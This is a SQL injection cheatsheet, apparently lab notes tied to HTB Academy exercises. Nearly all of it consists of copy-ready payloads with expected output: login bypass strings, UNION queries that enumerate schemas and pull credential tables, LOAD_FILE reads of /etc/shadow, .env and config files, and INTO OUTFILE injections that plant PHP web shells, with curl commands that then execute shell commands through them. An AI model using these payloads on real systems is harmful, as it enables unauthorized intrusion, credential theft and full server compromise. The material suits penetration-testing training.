# SQL Injection Cheatsheet

## Overview
SQL injection occurs when user input is not properly sanitized and is directly concatenated into SQL queries. This allows attackers to manipulate database queries and potentially extract data, bypass authentication, or execute commands.

**Common Injection Points:**
- Login forms (username/password fields)
- Search parameters  
- URL parameters
- HTTP headers (User-Agent, X-Forwarded-For)
- JSON/XML parameters

---

## Authentication Bypass

### Basic Auth Bypass
```sql
-- Username field payloads
admin' or '1'='1'-- -
admin' or 1=1-- -
admin'/**/or/**/1=1-- -
admin' or 'x'='x'-- -

-- Simple comment-out approach (HTB Academy example)
tom'; -- -

-- OR logic bypass approach (HTB Academy example)  
tom' OR '1' = '1' -- -

-- Password field (when username is known)
anything' or '1'='1'-- -
```

### SQL Comments Deep Dive

#### Comment Syntax Rules
```sql
-- Double dash comments (MySQL/SQL Server/Oracle)
-- IMPORTANT: Space required after --
-- ✅ CORRECT: admin'-- -  (note the space!)
-- ❌ WRONG:   admin'--    (no space - won't work!)

-- Hash comments (MySQL only)
admin'#
-- URL encoded: admin'%23 (# becomes %23 in URLs)

-- Inline comments (MySQL)
admin'/*comment*/password
```

#### Why Comments Work
```sql
-- Original query:
SELECT * FROM logins WHERE username='USER' AND password='PASS';

-- After injection with admin'-- -:
SELECT * FROM logins WHERE username='admin'-- - AND password='PASS';

-- Result: Everything after -- is ignored
SELECT * FROM logins WHERE username='admin'
```

### Auth Bypass with Comments
```sql
-- Basic comment-out approaches
admin'-- -                     # MySQL with required space
admin'#                        # MySQL hash comment  
admin'%23                      # URL encoded hash comment
admin')-- -                    # Close parenthesis + comment
admin'/*                       # Incomplete inline comment

-- Different comment styles by database
-- MySQL comment styles
admin')-- -
admin')#
admin')/*comment*/

-- SQL Server comments  
admin')-- -
admin');--

-- Oracle comments
admin')--
```

#### Complex Query Scenarios

**Scenario 1: Simple Query**
```sql
-- Original: SELECT * FROM logins WHERE username='admin' AND password='hash';
-- Injection: admin'-- -
-- Result: SELECT * FROM logins WHERE username='admin'-- ' AND password='hash';
-- ✅ Works: Password check bypassed
```

**Scenario 2: Parenthesis Challenge**
```sql
-- Original: SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='hash';
-- Injection: admin'-- -  
-- Result: SELECT * FROM logins WHERE (username='admin'-- ' AND id > 1) AND password='hash';
-- ❌ FAILS: Syntax error - unbalanced parenthesis!

-- Solution: admin')-- -
-- Result: SELECT * FROM logins WHERE (username='admin')-- ' AND id > 1) AND password='hash';
-- ✅ Works: Parenthesis balanced, rest commented out
```

**Scenario 3: Targeting Specific ID (HTB Academy)**
```sql
-- Original: SELECT * FROM logins WHERE (username='USER' AND id > 1) AND password='hash';
-- Goal: Login as user with specific ID (e.g., ID=5)

-- Injection: ' OR ID=5)-- -
-- Result: SELECT * FROM logins WHERE (username='' OR ID=5)-- - AND id > 1) AND password='hash';
-- Final: SELECT * FROM logins WHERE (username='' OR ID=5)
-- ✅ Works: Returns user with ID=5, bypassing all other conditions

-- Variations for different IDs:
' OR ID=1)-- -     # Target user with ID 1
' OR ID=3)-- -     # Target user with ID 3  
' OR ID=5)-- -     # Target user with ID 5 (HTB Academy example)
```

**Scenario 4: Multiple Conditions**
```sql
-- Original: SELECT * FROM logins WHERE username='admin' AND password='hash' AND status='active';
-- Injection: admin'-- -
-- Result: SELECT * FROM logins WHERE username='admin'-- ' AND password='hash' AND status='active';
-- ✅ Works: All additional conditions ignored
```

#### Troubleshooting Syntax Errors
```sql
-- Error: "You have an error in your SQL syntax"
-- Cause: Unbalanced parenthesis, quotes, or brackets

-- Common fixes:
admin')-- -     # Close one parenthesis
admin'))-- -    # Close two parentheses  
admin']-- -     # Close square bracket
admin'}-- -     # Close curly bracket (rare)
admin'"-- -     # Close quote mismatch
```

### Advanced Auth Bypass
```sql
-- Multiple conditions
admin' or 1=1 limit 1-- -
admin' or 1=1 limit 1 offset 0-- -

-- Using UNION
admin' UNION SELECT 1,1,'admin','password'-- -

-- Time-based confirmation
admin' or (select sleep(5))-- -
admin'; waitfor delay '0:0:5'-- -
```

---

## UNION Injection

### Understanding UNION Clause

#### What is UNION?
UNION clause combines results from multiple SELECT statements into a single result set. This allows SQL injection to extract data from multiple tables and databases.

**Basic UNION Example:**
```sql
-- Original tables:
SELECT * FROM ports;      -- Returns: CN SHA | Shanghai
SELECT * FROM ships;      -- Returns: Morrison | New York

-- Combined with UNION:
SELECT * FROM ports UNION SELECT * FROM ships;
-- Returns both tables combined:
-- CN SHA | Shanghai
-- Morrison | New York
```

#### Critical UNION Requirements

**1. Equal Column Count**
```sql
-- ✅ WORKS: Same number of columns (2 columns each)
SELECT city, code FROM ports UNION SELECT ship, city FROM ships;

-- ❌ FAILS: Different column counts
SELECT city FROM ports UNION SELECT * FROM ships;
-- Error: "The used SELECT statements have a different number of columns"
```

**2. Compatible Data Types**
```sql
-- ✅ WORKS: Compatible data types
SELECT username, id FROM users UNION SELECT product_name, price FROM products;

-- ❌ FAILS: Incompatible data types  
SELECT username, created_date FROM users UNION SELECT product_name, price FROM products;
```

#### How UNION Injection Works
```sql
-- Original vulnerable query:
SELECT * FROM products WHERE product_id = 'USER_INPUT'

-- Normal usage:
SELECT * FROM products WHERE product_id = '1'

-- UNION Injection:
SELECT * FROM products WHERE product_id = '1' UNION SELECT username, password FROM users-- '

-- Result: Shows both product data AND user credentials!
```

#### Handling Uneven Columns

**Problem: Different Column Counts**
```sql
-- Original query has 4 columns:
SELECT name, price, description, category FROM products WHERE id = 'USER_INPUT'

-- Target table has 2 columns:
SELECT username, password FROM users

-- Direct UNION fails - need to match column count!
```

**Solution: Junk Data**
```sql
-- Use numbers as junk data:
' UNION SELECT username, password, 3, 4 FROM users-- '

-- Use strings as junk data:
' UNION SELECT username, password, 'junk', 'data' FROM users-- '

-- Use NULL (universal - fits all data types):
' UNION SELECT username, password, NULL, NULL FROM users-- '
```

**Why Numbers Work Best:**
- **Tracking**: Numbers help identify which column displays where
- **Universal**: Numbers work with most data types  
- **Simple**: Easy to increment (1,2,3,4,5...)

**Example with 4 Columns:**
```sql
-- Injection: UNION SELECT username, 2, 3, 4 FROM users-- '
-- Result table:
+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+

-- Analysis: username appears in column 1, junk data in columns 2-4
```

#### HTB Academy Practical Example: employees/departments UNION

**Scenario:** Combine all records from `employees` and `departments` tables with different column counts.

**Step 1: Connect to MySQL**
```bash
mysql -h TARGET_IP -P TARGET_PORT -u root -ppassword
```

**Step 2: Analyze Table Structure**
```sql
USE employees;

-- Check employees table structure
DESCRIBE employees;
-- Output: 6 columns (emp_no, birth_date, first_name, last_name, gender, hire_date)

-- Check departments table structure  
DESCRIBE departments;
-- Output: 2 columns (dept_no, dept_name)
```

**Step 3: Handle Column Mismatch**
```sql
-- Problem: employees (6 columns) vs departments (2 columns)
-- Solution: Add 4 dummy columns to departments

-- Method 1: Count total records with subquery
SELECT COUNT(*) FROM (
    SELECT * FROM employees 
    UNION 
    SELECT dept_no, dept_name, 3, 4, 5, 6 FROM departments
) AS combined_results;

-- Method 2: View all data directly
SELECT * FROM employees 
UNION 
SELECT dept_no, dept_name, 3, 4, 5, 6 FROM departments;
```

**Step 4: Result Analysis**
```sql
-- Expected result: 663 total records
-- employees table: ~654 records
-- departments table: 9 records  
-- Combined: 654 + 9 = 663 records

+--------+--------------------+--------------+---------------+--------+------------+
| emp_no | birth_date         | first_name   | last_name     | gender | hire_date  |
+--------+--------------------+--------------+---------------+--------+------------+
| 10001  | 1953-09-02         | Georgi       | Facello       | M      | 1986-06-26 |
| 10002  | 1952-12-03         | Vivian       | Simmel        | F      | 1989-08-03 |
| d001   | Customer Service   | 3            | 4             | 5      | 6          |
| d002   | Development        | 3            | 4             | 5      | 6          |
+--------+--------------------+--------------+---------------+--------+------------+
```

**Key Learning Points:**
- **DESCRIBE** reveals table structure before UNION
- **Dummy columns** (3,4,5,6) fill missing positions
- **Subquery with COUNT()** gets total without displaying all data
- **Data type compatibility** - numbers work as universal placeholders

### Column Detection

#### Method 1: ORDER BY Technique

**How ORDER BY Works for Column Detection:**
ORDER BY sorts results by specified column number. If column doesn't exist → error.

**Step-by-Step Process:**
```sql
-- Step 1: Test column 1 (always exists)
' order by 1-- -
-- ✅ Result: Normal output (sorted by column 1)

-- Step 2: Test column 2  
' order by 2-- -
-- ✅ Result: Normal output (sorted by column 2, different order)

-- Step 3: Test column 3
' order by 3-- -
-- ✅ Result: Normal output (sorted by column 3)

-- Step 4: Test column 4
' order by 4-- -
-- ✅ Result: Normal output (sorted by column 4)

-- Step 5: Test column 5
' order by 5-- -
-- ❌ Error: "Unknown column '5' in 'order clause'"
-- CONCLUSION: Table has exactly 4 columns
```

**Error Indicators:**
- `Unknown column 'X' in 'order clause'` → Column X doesn't exist
- Empty/no results → Column X doesn't exist
- Database error → Column X doesn't exist

#### Method 2: UNION Technique

**How UNION Works for Column Detection:**
UNION requires equal column count. Mismatch → error. Match → success.

**Step-by-Step Process:**
```sql
-- Step 1: Test 1 column
cn' UNION select 1-- -
-- ❌ Error: "The used SELECT statements have a different number of columns"

-- Step 2: Test 2 columns
cn' UNION select 1,2-- -
-- ❌ Error: "The used SELECT statements have a different number of columns"

-- Step 3: Test 3 columns  
cn' UNION select 1,2,3-- -
-- ❌ Error: "The used SELECT statements have a different number of columns"

-- Step 4: Test 4 columns
cn' UNION select 1,2,3,4-- -
-- ✅ Success: Normal output with numbers displayed
-- CONCLUSION: Table has exactly 4 columns
```

**Comparison: ORDER BY vs UNION**
- **ORDER BY**: Always succeeds until error (incremental success → failure)
- **UNION**: Always fails until success (incremental failure → success)
- **Recommendation**: ORDER BY is often faster and more reliable

#### Location of Injection (Critical Concept!)

**Problem**: Not all columns display output on the webpage!

**Example Scenario:**
```sql
-- You detect 4 columns:
cn' UNION select 1,2,3,4-- -

-- But output only shows:
Port Code | Port City | Port Volume
----------|-----------|------------
    2     |     3     |     4

-- Analysis: 
-- Column 1: Hidden (not displayed)
-- Column 2: Displayed (Port Code)
-- Column 3: Displayed (Port City) 
-- Column 4: Displayed (Port Volume)
```

**Testing Which Columns Display:**
```sql
-- Test visibility with clear identifiers
cn' UNION select 'COL1','COL2','COL3','COL4'-- -

-- Expected visible output:
Port Code | Port City | Port Volume
----------|-----------|------------
   COL2   |   COL3    |    COL4

-- Conclusion: Can inject in columns 2, 3, or 4 only!
```

**Practical Data Extraction:**
```sql
-- ❌ WRONG: Inject in hidden column 1
cn' UNION select @@version,2,3,4-- -
-- Result: Version not visible (column 1 hidden)

-- ✅ CORRECT: Inject in visible column 2
cn' UNION select 1,@@version,3,4-- -
-- Result: "10.3.22-MariaDB-1ubuntu1" displayed in Port Code column

-- ✅ CORRECT: Inject in visible column 3
cn' UNION select 1,2,user(),4-- -
-- Result: "root@localhost" displayed in Port City column
```

**HTB Academy Question Solution:**
```sql
-- Step 1: Detect columns (already shown: 4 columns)
-- Step 2: Test visibility (columns 2,3,4 are visible)
-- Step 3: Extract user() in visible column
' UNION SELECT 1,user(),3,4-- -
-- Answer: root@localhost
```

### Basic UNION Injection

#### Step-by-Step UNION Injection Process

**1. Detect Injection Point**
```sql
-- Test for SQL injection with single quote
cn'
-- Look for: SQL errors, broken output, different behavior
```

**2. Detect Number of Columns**
```sql
-- Method A: ORDER BY (recommended)
cn' order by 1-- -     # ✅ Success  
cn' order by 4-- -     # ✅ Success
cn' order by 5-- -     # ❌ Error → 4 columns detected

-- Method B: UNION
cn' UNION select 1,2,3-- -     # ❌ Error
cn' UNION select 1,2,3,4-- -   # ✅ Success → 4 columns detected
```

**3. Identify Displayed Columns**
```sql
-- Test visibility with numbers
cn' UNION select 1,2,3,4-- -
-- Expected output: Only 2,3,4 visible → Column 1 is hidden

-- Confirm with text markers
cn' UNION select 'COL1','COL2','COL3','COL4'-- -
-- Result: COL2, COL3, COL4 visible → Inject in columns 2,3,4
```

**4. Extract Data**
```sql
-- Extract in visible columns only
cn' UNION select 1,@@version,3,4-- -        # Database version
cn' UNION select 1,user(),3,4-- -           # Current user  
cn' UNION select 1,database(),3,4-- -       # Current database
```

### Data Extraction via UNION
```sql
-- Current database version
cn' UNION select 1,@@version,3,4-- -
cn' UNION select 1,version(),3,4-- -

-- Current database name
cn' UNION select 1,database(),3,4-- -

-- Current user
cn' UNION select 1,user(),3,4-- -
cn' UNION select 1,current_user(),3,4-- -

-- Database hostname
cn' UNION select 1,@@hostname,3,4-- -
```

---

## Database Enumeration

### MySQL Fingerprinting

**Why Fingerprint?** Different DBMS use different syntax. Knowing the database type determines which payloads to use.

**MySQL Fingerprinting Techniques:**

| Payload | When to Use | Expected Output (MySQL) | Wrong Output (Other DBMS) |
|---------|-------------|-------------------------|---------------------------|
| `SELECT @@version` | Full query output | `10.3.22-MariaDB-1ubuntu1` | MSSQL version / Error |
| `SELECT POW(1,1)` | Numeric output only | `1` | Error |
| `SELECT SLEEP(5)` | Blind/No output | 5-second delay + returns 0 | No delay |

**Practical Fingerprinting:**
```sql
-- Test MySQL version (most reliable)
cn' UNION select 1,@@version,3,4-- -
-- Expected: "10.3.22-MariaDB-1ubuntu1" or similar

-- Test MySQL math function
cn' UNION select 1,POW(1,1),3,4-- -  
-- Expected: "1"

-- Test MySQL time delay (for blind injection)
cn' and SLEEP(5)-- -
-- Expected: 5-second response delay
```

### INFORMATION_SCHEMA Database

**What is INFORMATION_SCHEMA?**
- Built-in MySQL database containing **metadata** about all databases/tables
- Contains structure information, not actual user data
- Critical for SQL injection enumeration
- Always present in MySQL installations

**Key Tables in INFORMATION_SCHEMA:**
- **SCHEMATA** → Database names
- **TABLES** → Table names per database  
- **COLUMNS** → Column names per table

**Cross-Database Queries with Dot Operator:**
```sql
-- Query table in different database
SELECT * FROM database_name.table_name;

-- Example: Query users table in ilfreight database
SELECT * FROM ilfreight.users;
```

### Step-by-Step Enumeration Process

#### Step 1: Identify Current Database
```sql
-- Find which database the application uses
cn' UNION select 1,database(),3,4-- -
-- Example result: "ilfreight"
```

#### Step 2: Discover All Databases
```sql
-- List all databases on server
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

-- Expected output:
-- mysql (default - ignore)
-- information_schema (default - ignore)  
-- performance_schema (default - ignore)
-- ilfreight (target database)
-- dev (interesting database!)
```

**Filter Strategy:**
```sql
-- Ignore default databases
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA where schema_name not in ('mysql','information_schema','performance_schema','sys')-- -
```

#### Step 3: Enumerate Tables in Target Database
```sql
-- List tables in current database
cn' UNION select 1,table_name,3,4 from INFORMATION_SCHEMA.TABLES where table_schema=database()-- -

-- List tables in specific database (more useful)
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

-- Expected output:
-- credentials | dev
-- posts | dev  
-- framework | dev
-- pages | dev
```

#### Step 4: Enumerate Columns in Target Table
```sql
-- List columns in interesting table
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

-- Expected output:
-- username | credentials | dev
-- password | credentials | dev
```

#### Step 5: Extract Data
```sql
-- Extract data using discovered structure
cn' UNION select 1, username, password, 4 from dev.credentials-- -

-- Expected output:
-- admin | 9a3e... (hash)
-- dev_admin | 1fe8... (hash) 
-- api_key | secret_key_123
```

### HTB Academy Practical Example

**Scenario:** ilfreight application with dev database containing credentials

**Complete Enumeration Walkthrough:**
```sql
-- 1. Fingerprint MySQL
cn' UNION select 1,@@version,3,4-- -
-- Result: "10.3.22-MariaDB-1ubuntu1"

-- 2. Current database  
cn' UNION select 1,database(),3,4-- -
-- Result: "ilfreight"

-- 3. All databases
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
-- Results: mysql, information_schema, performance_schema, ilfreight, dev

-- 4. Tables in dev database
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
-- Results: credentials, posts, framework, pages

-- 5. Columns in credentials table
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
-- Results: username, password

-- 6. Extract credentials data
cn' UNION select 1, username, password, 4 from dev.credentials-- -
-- Results: admin/hash, dev_admin/hash, api_key/secret
```

**HTB Academy Question Solution:**
```sql
-- "What is the password hash for 'newuser' in 'users' table in 'ilfreight' database?"

-- Step 1: Enumerate columns in users table
cn' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- -

-- Step 2: Extract newuser password  
cn' UNION SELECT 1,username,password,4 FROM ilfreight.users WHERE username='newuser'-- -
```

### Quick Reference Payloads

**One-liner enumeration payloads for quick testing:**
```sql
-- Database discovery
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

-- Table discovery  
cn' UNION select 1,table_name,3,4 from INFORMATION_SCHEMA.TABLES where table_schema=database()-- -
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

-- Column discovery
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

-- Advanced filtering
cn' UNION select 1,concat(table_schema,':',table_name),3,4 from INFORMATION_SCHEMA.TABLES where table_schema not in ('mysql','information_schema','performance_schema','sys')-- -
```

### Data Extraction
```sql
-- Extract data from table
cn' UNION select 1, username, password, 4 from dev.credentials-- -

-- Extract specific user data
cn' UNION select 1, username, password, 4 from users where username='admin'-- -

-- Concatenate multiple columns
cn' UNION select 1, concat(username,':',password), 3, 4 from users-- -

-- Extract with conditions
cn' UNION select 1, username, password, 4 from users where id=1-- -
```

---

## Privilege and Configuration Enumeration

### User Information
```sql
-- Find current user
cn' UNION SELECT 1, user(), 3, 4-- -

-- Check admin privileges
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

-- List all database users
cn' UNION SELECT 1, user, host, 4 FROM mysql.user-- -
```

### Privilege Enumeration
```sql
-- User privileges
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

-- Global variables
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

-- Check file permissions
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="file_priv"-- -
```

---

## File Operations

### Prerequisites: Privilege Verification

**Why Check Privileges?** File operations require special database privileges. Not all users can read/write files.

#### Step 1: Identify Current Database User
```sql
-- Method A: Current user function
cn' UNION SELECT 1, user(), 3, 4-- -
-- Expected: "root@localhost" (ideal) or "app_user@localhost"

-- Method B: System user query  
cn' UNION SELECT 1, user, 3, 4 FROM mysql.user-- -
-- Shows: All database users
```

**Analysis:**
- **`root`** = High privileges (DBA) → Likely has FILE privilege
- **`app_user`** = Limited privileges → May not have FILE privilege

#### Step 2: Check Superuser Privileges  
```sql
-- Test if current user has admin privileges
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

-- Result interpretation:
-- Y = YES → User has superuser privileges
-- N = NO → User has limited privileges
```

#### Step 3: Enumerate Specific Privileges
```sql
-- List all privileges for current user
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

-- Look for these critical privileges:
-- FILE → Can read/write files
-- SELECT → Can read database data
-- INSERT → Can write database data
-- SUPER → Can perform admin operations
```

#### Step 4: Check FILE Privilege Restrictions
```sql
-- Check secure_file_priv setting (restricts file operations)
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -

-- Result interpretation:
-- NULL or Empty = No restrictions (can read/write anywhere)
-- /var/lib/mysql-files/ = Restricted to specific directory
-- (blank) = File operations completely disabled
```

### HTB Academy Complete Walkthrough

#### Scenario: Reading Application Source Code to Find Database Credentials

**Step 1: Verify User and Privileges**
```sql
-- 1. Check current user
cn' UNION SELECT 1, user(), 3, 4-- -
-- Result: "root@localhost" ✅ Promising

-- 2. Check super privileges  
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
-- Result: "Y" ✅ Has superuser privileges

-- 3. Verify FILE privilege
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
-- Look for: FILE privilege listed ✅ Can read files
```

**Step 2: Read Target Application Source**
```sql
-- Read the current page source (search.php)
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

-- Expected output: PHP source code showing:
<?php
include "config.php";  // ← KEY FINDING!
if (isset($_GET['port_code'])) {
    $query = "SELECT * FROM ports WHERE code='" . $_GET['port_code'] . "'";
    // ... rest of code
}
?>
```

**Step 3: Analyze Source Code for Include/Require**
```php
// Common PHP include patterns to look for:
include "config.php";          // Database credentials  
require_once "database.php";   // Connection settings
include "../includes/db.php";  // Relative path includes
require "/etc/app/secrets.php"; // Absolute path includes
```

**Step 4: Read Configuration Files**
```sql
-- Read the included config file
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -

-- Expected output: Database credentials
<?php
define('DB_HOST', 'localhost');
define('DB_USER', 'app_user');
define('DB_PASSWORD', 'secret_db_password_123');  // ← TARGET FOUND!
define('DB_NAME', 'application_db');
?>
```

**HTB Academy Question Solution:**
```sql
-- "Check the imported page to obtain the database password"

-- Step 1: Read search.php to find included file
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
-- Analysis: Find "include 'config.php'" statement

-- Step 2: Read config.php to get DB_PASSWORD  
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
-- Answer: Extract DB_PASSWORD value from PHP constants
```

### Common File Reading Targets

#### System Information
```sql
-- Linux system files
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -      # User accounts
cn' UNION SELECT 1, LOAD_FILE("/etc/shadow"), 3, 4-- -      # Password hashes (if permissions allow)
cn' UNION SELECT 1, LOAD_FILE("/etc/hosts"), 3, 4-- -       # Host configurations
cn' UNION SELECT 1, LOAD_FILE("/proc/version"), 3, 4-- -    # Kernel version
```

#### Web Application Files
```sql
-- Common web application files
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/index.php"), 3, 4-- -     # Main page
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -    # Database config
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/admin.php"), 3, 4-- -     # Admin panel
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/.env"), 3, 4-- -          # Environment variables
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/wp-config.php"), 3, 4-- - # WordPress config
```

#### Log Files (Information Gathering)
```sql
-- System and application logs
cn' UNION SELECT 1, LOAD_FILE("/var/log/apache2/access.log"), 3, 4-- -  # Web server logs
cn' UNION SELECT 1, LOAD_FILE("/var/log/mysql/error.log"), 3, 4-- -     # Database logs
cn' UNION SELECT 1, LOAD_FILE("/var/log/auth.log"), 3, 4-- -            # Authentication logs
```

#### Windows File Reading
```sql
-- Windows system files  
cn' UNION SELECT 1, LOAD_FILE("C:\\Windows\\System32\\drivers\\etc\\hosts"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("C:\\inetpub\\wwwroot\\web.config"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("C:\\Windows\\win.ini"), 3, 4-- -
```

### Quick Reference: File Reading Payloads

**Prerequisites: FILE privilege verified above ✅**

```sql
-- Basic LOAD_FILE syntax
cn' UNION SELECT 1, LOAD_FILE("file_path"), 3, 4-- -

-- Most common targets (quick copy-paste)
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -              # Linux users
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- - # Web config  
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/.env"), 3, 4-- -       # Environment
```

### File Writing

**⚠️ High Risk Operation:** File writing can lead to Remote Code Execution (RCE) and complete server compromise.

#### Prerequisites Verification (Critical!)

**3 Requirements for File Writing:**
1. **User with FILE privilege** ✅ (verified above)
2. **secure_file_priv allows writing** ❓ (must check)
3. **Write access to target directory** ❓ (must test)

#### Step 1: Verify secure_file_priv Setting

**What is secure_file_priv?**
- MySQL security variable that restricts file operations
- Controls WHERE files can be read/written
- Critical for determining write capabilities

**Check secure_file_priv Value:**
```sql
-- Check file operation restrictions
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -

-- Result interpretation:
-- (empty/blank) = No restrictions → Can write anywhere ✅
-- /var/lib/mysql-files/ = Restricted to specific directory ⚠️
-- NULL = File operations disabled ❌
```

**Expected HTB Academy Result:**
```
SECURE_FILE_PRIV | (empty) | 4
→ Analysis: Empty value = No restrictions ✅ Can write anywhere!
```

#### Step 2: Test Write Permissions

**Verify write access with test file:**
```sql
-- Test write to webroot
cn' UNION SELECT 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

-- Verification: Browse to http://target/proof.txt
-- Expected output: "1 file written successfully! 3 4"
```

**Result Analysis:**
- **No SQL errors** = Write operation succeeded ✅
- **File accessible via web** = Web path correct ✅  
- **Shows "1...3 4"** = UNION columns included in output

#### Step 3: Deploy Web Shell

**Clean Output Technique:**
```sql
-- Use empty strings instead of numbers for clean output
cn' UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" into outfile '/var/www/html/shell.php'-- -

-- Why empty strings?
-- Before: "1 <?php system($_REQUEST[0]); ?> 3 4" (broken PHP)
-- After:  "<?php system($_REQUEST[0]); ?>" (clean PHP) ✅
```

#### Step 4: Execute Commands

**Web Shell Usage:**
```bash
# Basic command execution
http://target/shell.php?0=id
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

# File system exploration  
http://target/shell.php?0=ls -la /
http://target/shell.php?0=cat /etc/passwd

# Find flags
http://target/shell.php?0=find / -name "*.txt" -type f 2>/dev/null | grep -i flag
http://target/shell.php?0=cat /var/www/html/flag.txt
```

### HTB Academy Complete Walkthrough

#### Scenario: Complete File Writing Attack Chain

**Step 1: Verify Prerequisites**
```sql
-- 1. Already confirmed: FILE privilege ✅
-- 2. Check secure_file_priv
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
-- Result: (empty) ✅ No restrictions

-- 3. Test write permissions
cn' UNION SELECT 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
-- Verify: http://target/proof.txt shows content ✅
```

**Step 2: Deploy Web Shell**
```sql
-- Write clean PHP web shell
cn' UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" into outfile '/var/www/html/shell.php'-- -
-- No SQL errors = Success ✅
```

**Step 3: Verify Web Shell**
```bash
# Test command execution
curl "http://target/shell.php?0=id"
# Expected: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Step 4: Find Flag (HTB Academy Question)**
```bash
# Search for flag files
curl "http://target/shell.php?0=find%20/%20-name%20%22*.txt%22%20-type%20f%202%3E/dev/null%20%7C%20grep%20-i%20flag"

# Read flag content
curl "http://target/shell.php?0=cat%20/path/to/flag.txt"
# Expected: d2b5b27ae688b6a0f1d21b7d3a0798cd
```

### Advanced Web Shell Variants

#### Enhanced Web Shells
```sql
-- Method 1: GET parameter version
cn' UNION SELECT "","<?php system($_GET['cmd']); ?>","","" into outfile '/var/www/html/cmd.php'-- -
-- Usage: http://target/cmd.php?cmd=id

-- Method 2: Full-featured shell
cn' UNION SELECT "",
'<?php 
if(isset($_REQUEST["cmd"])){ 
    echo "<pre>"; 
    $cmd = ($_REQUEST["cmd"]); 
    system($cmd); 
    echo "</pre>"; 
    die; 
}
?>',
"","" into outfile '/var/www/html/advanced.php'-- -
```

#### Binary Data Writing
```sql
-- For binary files/advanced payloads
cn' UNION SELECT "", FROM_BASE64("base64_encoded_payload"), "", "" into outfile '/var/www/html/binary.php'-- -
```

### Web Root Discovery Techniques

**When /var/www/html doesn't work:**

#### Configuration File Analysis
```sql
-- Apache configuration
cn' UNION SELECT 1, LOAD_FILE("/etc/apache2/apache2.conf"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/etc/apache2/sites-enabled/000-default"), 3, 4-- -

-- Nginx configuration  
cn' UNION SELECT 1, LOAD_FILE("/etc/nginx/nginx.conf"), 3, 4-- -

-- IIS configuration (Windows)
cn' UNION SELECT 1, LOAD_FILE("C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config"), 3, 4-- -
```

#### Common Web Root Locations
```sql
-- Try different paths until one works
cn' UNION SELECT "","test","","" into outfile '/var/www/test.txt'-- -      # Ubuntu/Debian
cn' UNION SELECT "","test","","" into outfile '/var/www/html/test.txt'-- -  # Apache default
cn' UNION SELECT "","test","","" into outfile '/usr/share/nginx/html/test.txt'-- - # Nginx
cn' UNION SELECT "","test","","" into outfile '/opt/lampp/htdocs/test.txt'-- -     # XAMPP
cn' UNION SELECT "","test","","" into outfile 'C:\\inetpub\\wwwroot\\test.txt'-- - # IIS
```

### Quick Reference: File Writing Payloads

```sql
-- Test write permissions
cn' UNION SELECT 1,'test',3,4 into outfile '/var/www/html/proof.txt'-- -

